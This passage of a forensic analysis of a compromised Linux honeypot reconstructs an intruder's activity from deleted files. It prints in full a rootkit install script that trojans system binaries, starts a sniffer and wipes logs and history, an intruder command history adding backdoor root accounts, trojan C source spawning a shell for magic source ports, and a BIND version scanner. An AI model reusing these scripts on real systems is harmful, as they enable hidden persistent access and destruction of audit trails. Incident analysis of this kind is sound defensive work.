+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+Based on the knowledge that a trojan version of sshd was compiled and
+installed on the system, a hunt for the source archive was started.
+
+Going back and selecting all deleted files, another mactime run was
+made with a starting date of 01/01/2000 (the beginning of the year in
+which in the incident occured) and the date of installation,
+11/05/2000.  Several of the files in /t/usr/man/.Ci are owned by
+1010/users.  A large file owned by this same user is accessed during
+the time frame of sshd installation, but has a modification date prior
+to the installation of the system:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov 08 00 06:52:59 18698240 .a. -rw-r--r-- 1010     users    <honeypot.hda5.dd-dead-109791>
+
+Nov 08 00 06:52:59 18698240 .a. -rw-r--r-- 1010     users    <honeypot.hda5.dd-dead-109791>
+Nov 08 00 06:56:08 18698240 ..c -rw-r--r-- 1010     users    <honeypot.hda5.dd-dead-109791>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+Recovered, this is found to be the source archive to the deleted
+ssh-1.2.27.tar file.
+
+There is even a script ("/t/usr/man/.Ci/ /Anap" -- the directory name
+does indeed consist of a single space character) meant to kill this
+file (it was not run, however):
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+#!/bin/sh
+echo [Anti nap]
+
+cd /
+cd usr/tmp
+rm -rf nap
+touch nap
+echo .
+echo .
+echo .
+echo .
+
+echo [Mission Completed]
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+An analysis of deleted file space on the hda8 partition using
+"lazarus" was then done.  String searches and file content examination
+locates a number of interesting files.
+
+A copy of the password file with the original backdoor accounts "own"
+and "adm1" was found in deleted file space:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+100332.t.txt (file 12 of 110) (END) - Next: 100335.t.txt
+
+root:$1$eJ2yI2DF$0cXQKjrEYcYHM/qJu2X6Z/:11266:0:99999:7:-1:-1:134540356
+bin:*:11266:0:99999:7:::
+daemon:*:11266:0:99999:7:::
+adm:*:11266:0:99999:7:::
+lp:*:11266:0:99999:7:::
+sync:*:11266:0:99999:7:::
+shutdown:*:11266:0:99999:7:::
+halt:*:11266:0:99999:7:::
+mail:*:11266:0:99999:7:::
+news:*:11266:0:99999:7:::
+uucp:*:11266:0:99999:7:::
+operator:*:11266:0:99999:7:::
+games:*:11266:0:99999:7:::
+gopher:*:11266:0:99999:7:::
+ftp:*:11266:0:99999:7:::
+nobody:*:11266:0:99999:7:::
+xfs:!!:11266:0:99999:7:::
+named:!!:11266:0:99999:7:::
+postgres:!!:11266:0:99999:7:::
+drosen:$1$X2MTV07B$jKfJisg1QOjpfXouUcg0i0:11266:0:99999:7:-1:-1:134540380
+own::10865:0:99999:7:-1:-1:134538460
+adm1:Yi2yCGHo0wOwg:10884:0:99999:7:-1:-1:134538412
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+31240.t.txt is encrypted text (This files just contains the files in
+the "scripts" directory from "tpack.tar".  The files are triply
+encrypted tcl files for "wire.tcl" and "quesadilla.tcl", two eggdrop
+addon scripts.)
+
+The "addbd" script (93521.t.txt) was found:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+#!/bin/sh
+echo "adding ps, tcpd, and ls hide files"
+sleep 1
+
+echo "Editing Ps bd files first"
+echo "2 slice2" >> /usr/man/p
+echo "2 snif" >> /usr/man/p
+echo "2 pscan" >> /usr/man/p
+echo "2 imp" >> /usr/man/p
+echo "3 qd" >> /usr/man/p
+echo "2 bs.sh" >> /usr/man/p
+echo "3 nn" >> /usr/man/p
+echo "3 egg.lin" >> /usr/man/p
+echo "2 slice2" >> /usr/man/.p
+echo "2 snif" >> /usr/man/.p
+echo "2 pscan" >> /usr/man/.p
+echo "2 imp" >> /usr/man/.p
+echo "3 qd" >> /usr/man/.p
+echo "2 bs.sh" >> /usr/man/.p
+echo "3 nn" >> /usr/man/.p
+echo "3 egg.lin" >> /usr/man/.p
+
+echo ".tp" >> /usr/man/r
+echo "tcp.log" >> /usr/man/r
+echo "slice2" >> /usr/man/r
+echo ".p" >> /usr/man/r
+echo ".a" >> /usr/man/r
+echo ".l" >> /usr/man/r
+echo "scan" >> /usr/man/r
+echo "a" >> /usr/man/r
+echo "p" >> /usr/man/r
+echo "addy.awk" >> /usr/man/r
+echo "qd" >> /usr/man/r
+echo "imp" >> /usr/man/r
+echo ".fakeid" >> /usr/man/r
+
+echo "Editing tcpd bd files"
+echo "1 63.203" >> /usr/man/.a
+echo "2 63.203" >> /usr/man/.a
+echo "1 209.250" >> /usr/man/.a
+echo "2 209.250" >> /usr/man/.a
+echo "3 113" >> /usr/man/.a
+echo "4 113" >> /usr/man/.a
+echo "3 35350" >> /usr/man/.a
+echo "4 35350" >> /usr/man/.a
+echo "1 216.33" >> /usr/man/.a
+echo "2 216.33" >> /usr/man/.a
+echo "1 63.206" >> /usr/man/.a
+echo "2 63.206" >> /usr/man/.a
+
+echo "done with the tcpd, ls, and ps files"
+sleep 1
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+94373.t.txt remote exploit (core file?) with 2222/tcp backdoor
+
+107110.t.txt encrypted text
+
+107123.t.txt "
+
+107210.t.txt "
+
+156859.t.txt is a deleted command history file, which shows commands
+that would require local access (use of the floppy disc), which are
+assumed to be the administrator of the system.  What follows the
+"exit" command is obviously the work of the intruder, installing
+the backdoor accounts "own" and "adm1".  (This is typically done
+by intruders who use a remote exploit that gives a root shell.  In
+this case, the exploit opens up a shell listening on port 4545/tcp.
+The intruder then uses "telnet" to connect to this port, and is given
+a root shell with no password.  They then set up alternate, more
+secure back doors, then disable this wide open back door.)
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+mkdir /floppy
+mount /dev/fd0 /floppy
+cd /floppy
+ls
+rm *gz
+./init
+cd
+umount /floppy
+exit
+ifconfig -a
+cd /etc/sysconfig
+ls
+vi network
+ls
+ls
+cd *pts
+ls
+cd ../net*pts
+ls
+vi *eth0
+ifconfig eth0 172.16.1.107 broadcst 172.16.1.255 netmask 255.255.255.0
+up
+ifconfig -a
+ifconfig eth0 broadcast 172.16.1.255
+ifconfig eht0 netmask 255.255.255.0
+ifconfig eth0 netmask 255.255.255.0
+ifconfig -a
+route add default gw 172.16.1.254
+netstat -nr
+exit
+uptime
+rm -rf /etc/hosts.deny
+touch /etc/hosts.deny
+rm -rf /var/log/wtmp
+touch /var/log/wtmp
+killall -9 klogd
+killall -9 syslogd
+rm -rf /etc/rc.d/init.d/*log*
+echo own:x:0:0::/root:/bin/bash >> /etc/passwd
+echo adm1:x:5000:5000:Tech Admin:/tmp:/bin/bash >> /etc/passwd
+echo own::10865:0:99999:7:-1:-1:134538460 >> /etc/shadow
+echo adm1:Yi2yCGHo0wOwg:10884:0:99999:7:-1:-1:134538412 >> /etc/shadow
+cat /etc/inetd.conf | grep tel
+exit
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+206417.t.txt encrypted text (Deleted version of e.conf, triply
+encrypted tcl)
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+bind filt - "\001ACTION *\001" filt_act
+proc filt_act {idx text} {
+  dccsimul $idx ".me [string trim [lrange $text 1 end] \001]"
+}
+
+bind filt - "/me *" filt_telnet_act
+proc filt_telnet_act {idx text} {
+  dccsimul $idx ".me [lrange $text 1 end]"
+}
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+206433.t.txt encrypted text?
+
+
+Various snippets of a tar archive containing the files from .Ci
+directory are visible in deleted file space.  This archive snippet
+(file name "install-sshd", recovered in file "90154.p.txt") shows the
+user name "xrt", group "users":
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
+^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
+^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@.Ci/install-sshd^@^@^@^@^@^@^@^@^@
+^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
+^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@0100755^@0
+001762^@0000144^@00000002064^@07116122235^@012563^@
+0^@^@^@^@^@^@^@^@^@^@^@^@^@
+^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
+^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
+^@^@^@^@^@^@^@ustar
+^@xrt^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
+^@^@users^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
+^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
+^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
+^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
+^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
+^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@echo "installing sshd"
+gunzip ssh-1.2.27*
+tar -xvf ssh-1.2.27*
+cd ssh*
+make install
+rm -rf /etc/sshd_config
+cat << hi >> /etc/sshd_config
+# This is ssh server systemwide configuration file.
+
+Port 22
+ListenAddress 0.0.0.0
+HostKey /etc/ssh_host_key
+RandomSeed /etc/ssh_random_seed
+ServerKeyBits 768
+LoginGraceTime 600
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+To prove this assumption, a simple tar archive was produced with a
+known file.  This was dumped with "xxd" to see how the tar archive
+file is formed.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+0000000: 666f 6f00 0000 0000 0000 0000 0000 0000  foo.............
+0000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0000060: 0000 0000 3031 3030 3634 3400 3030 3030  ....0100644.0000
+0000070: 3030 3000 3030 3030 3030 3000 3030 3030  000.0000000.0000
+0000080: 3030 3030 3031 3400 3037 3234 3433 3035  0000014.07244305
+0000090: 3133 3000 3031 3032 3534 0020 3000 0000  130.010254. 0...
+00000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0000100: 0075 7374 6172 2020 0072 6f6f 7400 0000  .ustar  .root...
+0000110: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0000120: 0000 0000 0000 0000 0072 6f6f 7400 0000  .........root...
+0000130: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0000140: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0000150: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0000160: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0000170: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0000180: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0000190: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00001a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00001b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00001c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00001d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00001e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00001f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0000200: 5468 6973 2069 7320 666f 6f0a 0000 0000  This is foo.....
+0000210: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+ . . .
+00027e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00027f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+The snippet of tar archive found in "90154.p.txt" was then edited
+(first with "vim", then using "xxd") to remove leading and trailing
+garbage.  "tar" can then be used to convert the directory information
+for you:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# tar -tvf foo.tar
+tar: Record size = 4 blocks
+-rwxr-xr-x xrt/users      1076 2000-06-02 23:24:29 .Ci/install-sshd
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+Other snippets of tar archives can be viewed in the lazarus "blocks"
+directory using the following command:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# less `grep ustar * | awk '{print $3}'`
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+
+install (90158.t.txt):
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+#!/bin/sh
+rm -rf /root/.bash_history
+ln -s /dev/null /root/.bash_history
+rm -rf /.bash_history
+ln -s /dev/null /.bash_history
+rm -rf ~games/.bash_history
+ln -s /dev/null ~games/.bash_history
+rm -rf /tmp/.bash_history
+ln -s /dev/null /tmp/.bash_history
+rm -rf /usr/games/.bash_history
+ln -s /dev/null /usr/games/.bash_history 
+mkdir backup
+cp /bin/ps backup
+cp /usr/bin/top backup
+cp /usr/sbin/syslogd backup
+cp /bin/ls backup
+cp /bin/netstat backup
+cp /sbin/ifconfig backup
+cp /usr/sbin/tcpd backup
+echo "Trojaning in progress"
+./fix /bin/ps ps
+./fix /usr/bin/top top
+./fix /usr/sbin/syslogd syslogd
+./fix /bin/ls ls
+./fix /sbin/ifconfig ifconfig
+./fix /bin/netstat netstat
+./fix /usr/sbin/tcpd tcpd
+./fix /usr/sbin/in.identd in.identd
+
+killall -HUP syslogd
+./addbd
+./snif &
+echo "Sniffer ENABLED"
+echo "running clean and a.sh"
+./clean
+./a.sh
+mv ptyp /dev
+gunzip rpms.tgz;tar -xvf rpms.tar;cd rpms;rpm -Uvh --force *.rpm;cd ..;rm -rf rpms*
+killall -1 lpd
+rm -rf /var/log/wtmp
+cd /var/log
+touch wtmp
+cd /usr/man/.Ci
+rm -rf install addbd
+killall -HUP inetd
+cp bx /bin/
+chmod 755 /bin/bx
+rm /usr/sbin/in.ftpd
+mv in.ftpd /usr/sbin/
+chmod +x /usr/sbin/in.ftpd
+echo "done with installing shit"
+echo "i'll now run whereis sshd"
+echo "if nothing shows up then run ./install-sshd"
+echo "if it's in /usr/local/sbin/sshd then run ./install-sshd"
+echo "if it's in /usr/sbin/sshd then run ./install-sshd1"
+whereis sshd
+echo "after successfully installing sshd, run ./do"
+echo "rootkit installation complete."
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+This script suggests running "./do" after installing the sshd.  "do"
+contains:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+cat /etc/passwd|grep -v own > /etc/passwd.good
+mv /etc/passwd.good /etc/passwd
+
+cat /etc/shadow|grep -v own > /etc/shadow.good
+mv /etc/shadow.good /etc/shadow
+
+cat /etc/passwd|grep -v adm1 > /etc/passwd.good   
+mv /etc/passwd.good /etc/passwd
+
+cat /etc/shadow|grep -v adm1 > /etc/shadow.good   
+mv /etc/shadow.good /etc/shadow
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+"do" was done at 06:55:58, removing the two backdoor accounts:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov 08 00 06:55:58      657 m.c -rw-r--r-- root     root     /t/etc/passwd
+                        601 m.c -rw-r--r-- root     root     /t/etc/shadow
+                        328 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/do
+Nov 08 00 06:56:02     1024 m.c drwxr-xr-x root     root     /t/var/log
+                       7974 mac -rw-r--r-- root     root     /t/var/log/messages
+                        268 mac -rw-r--r-- root     root     /t/var/log/secure
+                          0 mac -rw-r--r-- root     root     /t/var/log/xferlog
+                          0 .ac -rw-r--r-- root     root     <honeypot.hda7.dd-dead-12107>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+install-named (90157.a.txt):
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+gunzip named.tgz
+;tar -xvf named.tar
+cd bin
+./install
+cd ..
+rm -rf bin named.tar
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+"install-statd" ("96577.p.txt")
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+echo statd patch
+echo ..
+rpm -Uvh nfs-utils-0.1.9.1-1.i386.rpm
+echo ..
+/etc/rc.d/init.d/nfslock restart 
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+"install-wu" ("96928.a.txt")
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+echo patching wuftpd
+echo ..
+rpm -Uvh wuftpd.rpm
+echo ..
+echo finished
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+While not included in the backup directory, this script shows
+the in.identd is trojaned.  Sure enough, there is visible evidence
+of the trojan in "strings" output:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ . . .
+data_start
+_fini
+envoye_don_le_trojan
+fclose@@GLIBC_2.1
+exit@@GLIBC_2.0
+_edata
+ . . .
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+The string "envoye_don_le_trojan" is the signature of the Binary
+Trojan Maker (btm) program.  This program has not had wide discussion
+to date, but a web page does exist that discusses its use:
+
+	http://smart.physik.fu-berlin.de/~dreger/attack/
+
+The output example "hello.c" trojan shows the following C source code
+for this function:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+envoye_don_le_trojan(char** argv,char** envp)
+{
+struct sockaddr_in addr;
+int addrsize;
+struct in_addr host;
+unsigned short int port;
+
+  addrsize=sizeof(addr);
+  if (!getpeername(0,(struct sockaddr*)&addr,&addrsize)) {
+    if (addr.sin_family==AF_INET) {
+      host=addr.sin_addr;
+      port=ntohs(addr.sin_port);
+      if ( (port>=MAGIC_PORT) && (port<(MAGIC_PORT+NB_MAGIC_PORT)) ) 
+        execl("/bin/sh","sh","-i",NULL); 
+    }
+  }
+}
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+A disassembly with "reqt" shows the following in the live code:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ . . .
+---- Function : envoye_don_le_trojan ----
+
+Referenced from call at 08048635 ; 
+
+080485d0 <envoye_don_le_trojan> push   %ebp
+080485d1 <envoye_don_le_trojan+0x1> mov    %esp,%ebp
+080485d3 <envoye_don_le_trojan+0x3> sub    $0x14,%esp
+080485d6 <envoye_don_le_trojan+0x6> movl   $0x10,0xffffffec(%ebp)
+080485dd <envoye_don_le_trojan+0xd> lea    0xffffffec(%ebp),%eax
+080485e0 <envoye_don_le_trojan+0x10> push   %eax
+080485e1 <envoye_don_le_trojan+0x11> lea    0xfffffff0(%ebp),%eax
+080485e4 <envoye_don_le_trojan+0x14> push   %eax
+080485e5 <envoye_don_le_trojan+0x15> push   $0x0
+
+Reference to function : getpeername@@GLIBC_2.0
+
+080485e7 <envoye_don_le_trojan+0x17> call   080484c4 <_init+0xc0>
+080485ec <envoye_don_le_trojan+0x1c> add    $0xc,%esp
+080485ef <envoye_don_le_trojan+0x1f> test   %eax,%eax
+080485f1 <envoye_don_le_trojan+0x21> jne    08048622 <envoye_don_le_trojan+0x52>
+080485f3 <envoye_don_le_trojan+0x23> cmpw   $0x2,0xfffffff0(%ebp)
+080485f8 <envoye_don_le_trojan+0x28> jne    08048622 <envoye_don_le_trojan+0x52>
+080485fa <envoye_don_le_trojan+0x2a> mov    0xfffffff2(%ebp),%ax ; port=addr.sin_port
+080485fe <envoye_don_le_trojan+0x2e> ror    $0x8,%ax             ; rotate right 8 bits
+08048602 <envoye_don_le_trojan+0x32> add    $0x3fa9,%ax          ; add 16297
+08048606 <envoye_don_le_trojan+0x36> cmp    $0x1,%ax             ; result > 1?
+0804860a <envoye_don_le_trojan+0x3a> ja     08048622 <envoye_don_le_trojan+0x52>
+                                                                 ; 
+0804860c <envoye_don_le_trojan+0x3c> push   $0x0
+
+Possible reference to string:
+"-i"
+
+0804860e <envoye_don_le_trojan+0x3e> push   $0x8048740
+
+Possible reference to string:
+"sh"
+
+08048613 <envoye_don_le_trojan+0x43> push   $0x8048743
+
+Possible reference to string:
+"/bin/sh"
+
+08048618 <envoye_don_le_trojan+0x48> push   $0x8048746
+
+Reference to function : execl@@GLIBC_2.0
+
+0804861d <envoye_don_le_trojan+0x4d> call   08048444 <_init+0x40>
+ . . .
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+[This doesn't match the C source.  What is going on around 080485fe to
+trigger the trojan?]
+
+The name "Ci", used for the directory, appears to also possibly be a
+group or individual name.  It shows up in the context of script
+feedback, as seen in the bind scanner script
+/t/usr/man/.Ci/scan/bind/ibind.sh:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+#!/bin/sh
+
+if [ $# != 1 ]; then
+        echo " .Ci.";
+        echo "Bind scanner"
+        echo "Usage: ./ibind.sh <b or c class>"
+        exit;
+fi
+
+A=`echo $1 | cut -d "." -f1`
+B=`echo $1 | cut -d "." -f2`
+C=`echo $1 | cut -d "." -f3`
+FILE=$1.pscan
+VULN=$1.vuln
+OUT=$1.out
+VULN1=temp1.scan
+VULN2=temp2.scan
+VULN3=temp3.scan
+VULN4=temp4.scan
+VULN5=temp5.scan
+VULN6=temp6.scan
+VULN7=temp7.scan
+VULN8=temp8.scan
+VULN9=temp9.scan
+VULN10=temp10.scan
+VULN11=temp11.scan
+VULN12=temp1.vuln
+VULN13=temp2.vuln
+VULN14=temp3.vuln
+VULN15=temp4.vuln
+VULN16=temp5.vuln
+
+
+
+echo ".Ci. : running pscan..."
+./pscan $A.$B 53 $C >> $FILE
+
+for i in `cat $FILE`; do
+        dig version.bind @$i chaos txt >> $OUT 2>/dev/null &
+done
+echo ".Ci. : Now sorting output" 
+touch $VULN
+
+cat $OUT|grep -v ";;" >> $VULN1
+cat $VULN1|grep -v "server" >> $VULN2   
+cat $VULN2|grep -v "@0" >> $VULN3
+cat $VULN3|grep -v "@3" >> $VULN4
+cat $VULN4|grep -v "@4" >> $VULN5
+cat $VULN5|grep -v "@-" >> $VULN6
+cat $VULN6|grep -v "@sec" >> $VULN7
+cat $VULN7|grep -v "@Scan" >> $VULN8
+cat $VULN8|grep -v "@completed" >> $VULN9
+cat $VULN9|grep -v "8.2.2-P" >> $VULN10
+cat $VULN10|grep -v "@in" >> $VULN11
+cat $VULN11|grep "8.2.1" -B 2 >> $VULN12
+cat $VULN11|grep "\"8.2\"" -B 2 >> $VULN12
+
+echo ".Ci. : scan completed"  
+echo " Found (`cat $VULN12|grep "8.2.1" -c`) 8.2.1 hosts"
+echo " Found (`cat $VULN12|grep "\"8.2\"" -c`) 8.2 hosts"
+cat $VULN12 | grep -v "VERSION" >> $VULN13
+cat $VULN13 | cut -d "@" -f2 >> $VULN14  
+cat $VULN14 | cut -d " " -f1 >> $VULN15
+cat $VULN15 | grep -v "-" >> $VULN16
+cat $VULN16 | grep $A >> $VULN
+echo " Total of `cat $VULN|grep $A.$B -c` host(s)!"
+rm -rf $OUT $FILE
+rm -rf $VULN1 $VULN2 $VULN3 $VULN4
+rm -rf $VULN5 $VULN6 $VULN7 $VULN8
+rm -rf $VULN9 $VULN10 $VULN11 $VULN12
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+This may be associated with the following group, which shows up in the
+attrition.org defacement mirror:
+
+http://www.cixx.org/
+http://www.attrition.org/mirror/attrition/2001/02/08/www.bio.umss.edu.bo/mirror.html
+http://www.hideabank.com/
+
+The name "nap" also shows up in defacement archives, e.g.:
+
+http://www.hackerattack.org/hacks/budweiser.htm
